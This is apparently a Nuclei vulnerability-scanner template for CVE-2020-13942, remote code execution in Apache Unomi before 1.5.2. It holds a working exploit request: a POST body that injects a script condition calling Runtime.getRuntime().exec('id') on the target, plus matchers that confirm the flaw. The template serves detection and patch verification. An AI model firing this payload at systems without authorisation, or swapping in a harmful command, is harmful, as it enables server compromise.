http:
- body: "{\n  \"filters\": [\n    {\n      \"id\": \"{{id}}\",\n      \"filters\"\
    : [\n        {\n          \"condition\": {\n            \"parameterValues\": {\n\
    \              \"nuclei\": \"script::Runtime.getRuntime().exec('id')\"\n     \
    \       },\n            \"type\": \"profilePropertyCondition\"\n          }\n\
    \        }\n      ]\n    }\n  ],\n  \"sessionId\": \"nuclei\"\n}\n"
  headers:
    Content-Type: application/json
  matchers:
  - condition: and
    part: header
    type: word
    words:
    - application/json
    - context-profile-id
  - condition: and
    part: body
    regex:
    - (profile|session)(Id|Properties|Segments)
    - '[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/context.json'
id: CVE-2020-13942
info:
  author: dwisiswant0
  classification:
    cpe: cpe:2.3:a:apache:unomi:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-13942
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-74,CWE-20
    epss-percentile: 0.99946
    epss-score: 0.9432
  description: 'Apache Unomi allows conditions to use OGNL and MVEL scripting which

    offers the possibility to call static Java classes from the JDK

    that could execute code with the permission level of the running Java process.

    This vulnerability affects all versions of Apache Unomi prior to 1.5.2.

    '
  impact: 'Successful exploitation of this vulnerability can allow an attacker to
    execute arbitrary code on the affected server.

    '
  metadata:
    max-request: 1
    product: unomi
    vendor: apache
  name: Apache Unomi <1.5.2 - Remote Code Execution
  reference:
  - https://securityboulevard.com/2020/11/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/
  - https://twitter.com/chybeta/status/1328912309440311297
  - https://nvd.nist.gov/vuln/detail/CVE-2020-13942
  - http://unomi.apache.org./security/cve-2020-13942.txt
  - https://lists.apache.org/thread.html/r4a8fa91836687eaca42b5420a778ca8c8fd3a3740e4cf4401acc9118@%3Cusers.unomi.apache.org%3E
  remediation: Apache Unomi users should upgrade to 1.5.2 or later.
  severity: critical
  tags: cve,cve2020,apache,rce,vkev,vuln
variables:
  id: '{{to_lower(rand_text_alpha(5))}}'
